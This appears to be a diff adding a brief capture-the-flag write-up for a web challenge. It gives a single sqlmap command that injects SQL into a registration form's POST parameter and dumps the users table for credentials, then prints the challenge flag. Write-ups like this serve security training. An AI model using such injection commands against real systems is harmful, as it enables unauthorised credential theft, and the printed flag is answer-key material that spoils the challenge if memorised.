@@ -1,0 +1,4 @@
+Using sqlmap, we can analyze the database and get the correct credentials using the payload
+./sqlmap.py -T users --dump --dbms mysql --method POST --data=register=g -p register --prefix "'" -u 'http://web2015.icec.tf/authorize/register.php'
+
+The flag is flag_binary_search_those_credentials
